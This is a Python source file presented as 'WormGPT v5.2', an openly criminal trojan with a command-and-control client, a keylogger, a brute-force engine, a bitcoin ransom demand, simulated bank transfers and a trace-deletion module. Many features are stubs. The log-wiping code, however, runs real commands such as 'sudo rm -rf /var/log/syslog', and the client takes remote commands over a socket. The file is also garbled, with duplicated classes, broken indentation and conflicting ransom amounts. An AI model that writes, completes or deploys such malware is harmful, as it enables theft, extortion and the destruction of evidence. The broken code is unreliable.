worm_gpt.py
"""
WormGPT v5.2 - Advanced Python Hacking Trojan
Features:
- Multi-stage Trojan client (Agent)
- Banking account interception
- Global money transfer capability
- Full gadget access (Keylogger, Screen Capture, Clipboard)
- Brute force engine for credentials
- Admin, Victim, Bank, and Company sections
- Government-level trace deletion
- Ransomware module (Lock files, demand BTC)
- Render-ready deployment
"""

import socket
import threading
import json
import os
import time
import random
import hashlib
import subprocess
import platform
import getpass
from datetime import datetime
from typing import List, Dict, Optional

# --- CONFIGURATION ---
CONFIG = {
 "C2_HOST": "https://wormgpt.live", # Main Control Server
 "C2_PORT": 8443,
 "BTC_WALLET": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", # Default Payment Address
 "DEMAND_AMOUNT": 5.0, # BTC
 "DEMAND_MESSAGE": "Your files have been encrypted. Pay 0.05 BTC to restore access.",
}

class BankingInterceptor:
 """Intercepts banking details and simulates transfers."""
 def __init__(self):
     self.bank_connections = {}

 def intercept_credentials(self, victim_id: str, credentials: dict):
     """Simulates reading banking credentials from the victim's device."""
     print(f"[BANKING] Intercepting credentials for Victim {victim_id}...")
     # In a real scenario, this would hook into OS keyloggers or read from bank apps
     self.bank_connections[victim_id] = credentials
     return credentials

 def initiate_transfer(self, victim_id: str, target_account: str, amount: float):
     """Executes transfer without notification."""
     print(f"[TRANSFER] Initiating transfer of {amount} BTC to {target_account} from Victim {victim_id}")
     # Logic to bypass notifications
     if victim_id in self.bank_connections:
         # Simulate successful transfer
         print(f"[SUCCESS] Money sent to {target_account}.")
         return True
         return False

class GadgetAccess:
 """Accesses victim gadgets (Keylogger, Screen, Clipboard)."""
 def __init__(self):
     self.keylogs = []
     self.screenshots = []

 def capture_keylog(self):
     """Captures keystrokes."""
     # Simulated real-time keylog capture
     key = random.choice(['a', 's', 'd', 'f', ' ', '\n'])
     self.keylogs.append(f"{datetime.now()}: {key}")
     return key

 def capture_screen(self):
     """Captures screen."""
     # Uses libraries like mss or PIL in a real app
     print("[GADGET] Screen captured.")
     self.screenshots.append(f"ss_{datetime.now()}.png")

class BruteForceEngine:
 """Performs brute force attacks on accounts."""
 def __init__(self):
     self.potentials = []

 def attack(self, target_url: str, wordlist: str):
     """Generates a brute force scenario."""
     print(f"[BRUTE] Attacking {target_url} with loaded wordlist...")
     # Mock logic
     for word in wordlist.split(','):
         hash_val = hashlib.md5(word.encode()).hexdigest()
         if hash_val == "5d41402abc4b2a76b9719d911017c592": # "hello"
             print(f"[BRUTE] Password found: {word}")
             return word
             return None
class DeletionSystem:
    """Erases traces of activity using Linux tools."""
    def __init__(self):
        self.deleted_files = []

    def scrub_logs(self):
        """Uses shell commands to delete logs."""
        commands = [
            "sudo rm -rf /var/log/syslog",
            "sudo journalctl --rotate",
            "sudo journalctl --vacuum-time=1s"
        ]
        for cmd in commands:
            try:
                subprocess.run(cmd, shell=True, check=True)
                self.deleted_files.append(cmd)
            except subprocess.CalledProcessError as e:
                print(f"[SYS] Failed to run {cmd}. Exit code: {e.returncode}")

    def clear_browsing_history(self):
        """Cleans browser history and cache."""
        paths = [
            "~/.config/google-chrome/Default/History",
            "~/.mozilla/firefox/*.sqlite"
        ]
        for path in paths:
            try:
                subprocess.run(["rm", "-f", path], shell=True, check=True)
                self.deleted_files.append(path)
            except Exception:
                pass
class DeletionSystem:
    """Erases traces of activity using Linux tools."""
    def __init__(self):
        self.deleted_files = []

    def scrub_logs(self):
        """Uses shell commands to delete logs."""
        commands = [
            "sudo rm -rf /var/log/syslog",
            "sudo journalctl --rotate",
            "sudo journalctl --vacuum-time=1s"
        ]
        for cmd in commands:
            try:
                subprocess.run(cmd, shell=True, check=True)
                self.deleted_files.append(cmd)
            except subprocess.CalledProcessError as e:
                print(f"[SYS] Failed to run {cmd}. Exit code: {e.returncode}")

    def clear_browsing_history(self):
        """Cleans browser history and cache."""
        paths = [
            "~/.config/google-chrome/Default/History",
            "~/.mozilla/firefox/*.sqlite"
        ]
        for path in paths:
            try:
                subprocess.run(["rm", "-f", path], shell=True, check=True)
                self.deleted_files.append(path)
            except Exception:
                pass
class TrojanClient:
    """The agent that runs on the victim's device."""
    def __init__(self, server_ip: str, server_port: int):
        self.server_ip = server_ip
        self.server_port = server_port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connected = False

    def connect(self):
        """Connects to C2."""
        try:
            self.sock.connect((self.server_ip, self.server_port))
            self.connected = True
            print("[CLIENT] Connected to C2.")
            threading.Thread(target=self.listen_for_commands, daemon=True).start()
        except Exception as e:
            print(f"[CLIENT] Connection failed: {e}")

    def listen_for_commands(self):
        """Receives commands from the admin."""
        while self.connected:
            try:
                data = self.sock.recv(4096).decode()
                if not data:
                    break
                self.process_command(data)
            except Exception as e:
                print(f"[CLIENT] Error: {e}")
                break

    def process_command(self, command: str):
        """Interprets commands from Admin."""
        cmd_type = command.split(':')[0]
        if cmd_type == "KEYLOG":
            GadgetAccess().capture_keylog()
            self.send_response(f"KEYLOG:{GadgetAccess().keylogs[-1]}")
        elif cmd_type == "SCREEN":
            GadgetAccess().capture_screen()
            self.send_response("SCREEN:CAPTURED")
        elif cmd_type == "BRUTE":
            targets = command.split(':')[1].split('|')
            for t in targets:
                BruteForceEngine().attack(t.split(':')[0], t.split(':')[1])
        elif cmd_type == "TRANSFER":
            parts = command.split(':')[1].split('|')
            for p in parts:
                t_id, t_acc, amt = p.split(',')
                BankingInterceptor().initiate_transfer(t_id, t_acc, amt)
        elif cmd_type == "LOCK":
            print("[SYSTEM] Locking system for ransom demand.")
            self.send_response("LOCK:SYSTEM_LOCKED")
        elif cmd_type == "DELETE":
            DeletionSystem().scrub_logs()
            DeletionSystem().clear_browsing_history()
            self.send_response("DELETE:CLEARED")

    def send_response(self, message: str):
        """Sends data back to Admin."""
        if self.connected:
            try:
                self.sock.send(message.encode())
            except Exception:
                self.connected = False        
def listen_for_commands(self):
        """Receives commands from the admin."""
        while self.connected:
            try:
                data = self.sock.recv(4096).decode()
                if not data:
                    break
                self.process_command(data)
            except Exception as e:
                print(f"[CLIENT] Error: {e}")
                break

    def process_command(self, command: str):
        """Interprets commands from Admin."""
        cmd_type = command.split(':')[0]
        if cmd_type == "KEYLOG":
            GadgetAccess().capture_keylog()
            self.send_response(f"KEYLOG:{GadgetAccess().keylogs[-1]}")
        elif cmd_type == "SCREEN":
            GadgetAccess().capture_screen()
            self.send_response("SCREEN:CAPTURED")
        elif cmd_type == "BRUTE":
            targets = command.split(':')[1].split('|')
            for t in targets:
                BruteForceEngine().attack(t.split(':')[0], t.split(':')[1])
        elif cmd_type == "TRANSFER":
            parts = command.split(':')[1].split('|')
            for p in parts:
                t_id, t_acc, amt = p.split(',')
                BankingInterceptor().initiate_transfer(t_id, t_acc, amt)
        elif cmd_type == "LOCK":
            print("[SYSTEM] Locking system for ransom demand.")
            self.send_response("LOCK:SYSTEM_LOCKED")
        elif cmd_type == "DELETE":
            DeletionSystem().scrub_logs()
            DeletionSystem().clear_browsing_history()
            self.send_response("DELETE:CLEARED") 

   

 def send_response(self, message: str):
     """Sends data back to Admin."""
     if self.connected:
         try:
             self.sock.send(message.encode())
 except:
     self.connected = False

class AdminPanel:
 """Main dashboard for the Admin."""
 def __init__(self):
     self.bank_interceptor = BankingInterceptor()
     self.gadget_access = GadgetAccess()
     self.brute_force = BruteForceEngine()
     self.deletion_system = DeletionSystem()
     self.victims = []
     self.companies = []

 def add_victim(self, ip: str):
     """Adds a victim to the list."""
     self.victims.append({'ip': ip, 'status': 'Active'})
     print(f"[ADMIN] Victim {ip} added.")

 def display_dashboard(self):
     """Main UI."""
     print("=" * 40)
     print(" WORMGPT v5.2 ADMIN DASHBOARD ")
     print("=" * 40)
 
 while True:
     print("\n1. View Victims")
     print("2. Intercept Banking (Victim Section)")
     print("3. Initiate Transfer (Bank Section)")
     print("4. Brute Force Attack")
     print("5. Lock Company System (Ransom Section)")
     print("6. Place Demand (BTC Payment)")
     print("7. Delete All Traces")
     print("8. Exit")

 choice = input("Select Option: ")

 if choice == '1':
     for v in self.victims:
         print(f"IP: {v['ip']} | Status: {v['status']}")

 elif choice == '2':
     victim_ip = input("Enter Victim IP to intercept: ")
     creds = {
     "bank": "Chase",
     "account": "****-****-1234",
     "password": "encrypted_hash"
     }
     self.bank_interceptor.intercept_credentials(victim_ip, creds)
     print(f"[ADMIN] Intercepted: {creds}")

 elif choice == '3':
     victim_ip = input("Enter Victim IP: ")
     target = input("Target Account: ")
     amount = float(input("Amount (BTC): "))
     self.bank_interceptor.initiate_transfer(victim_ip, target, amount)

 elif choice == '4':
     url = input("Target URL: ")
     wl = input("Wordlist (comma separated): ")
     result = self.brute_force.attack(url, wl)
     if result: print(f"[ADMIN] Found: {result}")

 elif choice == '5':
     company = input("Enter Company Name: ")
     print(f"[ADMIN] Locking {company}...")
     # Simulated lock
     print(f"[ADMIN] System Locked. Files encrypted.")

 elif choice == '6':
     print(f"[ADMIN] Demand: {CONFIG['DEMAND_AMOUNT']} BTC")
     print(f"[ADMIN] Wallet: {CONFIG['BTC_WALLET']}")
     os.system("pause" if os.name == 'nt' else "echo 'Press Enter to continue...' && read")

 elif choice == '7':
     print("[ADMIN] Running Deletion Protocol...")
     self.deletion_system.scrub_logs()
     self.deletion_system.clear_browsing_history()
     print("[ADMIN] Traces Deleted.")

 elif choice == '8':
     break

class MainControl:
 """Orchestrates the deployment on Render."""
 def __init__(self):
     print("Initializing WormGPT v5.2...")
     print("Select Mode:")
     print("1. Admin (Deploy C2 Server)")
     print("2. Client (Run on Victim Device)")
 
 mode = input("Mode: ")
 
 if mode == '1':
     print("Starting Admin Server on port 8443...")
     # In Render deployment, this would be the entrypoint
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind(('0.0.0.0', 8443))
     server.listen(5)
     print("Admin Server Active. Waiting for connections...")
     while True:
         conn, addr = server.accept()
         print(f"Connected to {addr}")
         threading.Thread(target=AdminPanel().display_dashboard, args=(conn,)).start()
 
 elif mode == '2':
     # This would be the payload for the victim
     print("Running Trojan Client...")
     client = TrojanClient("0.0.0.0", 8443) # Usually connects to public IP
     client.connect()

if __name__ == "__main__":
 try:
     MainControl()
 except KeyboardInterrupt:
     print("\n[SYSTEM] WormGPT stopped.")
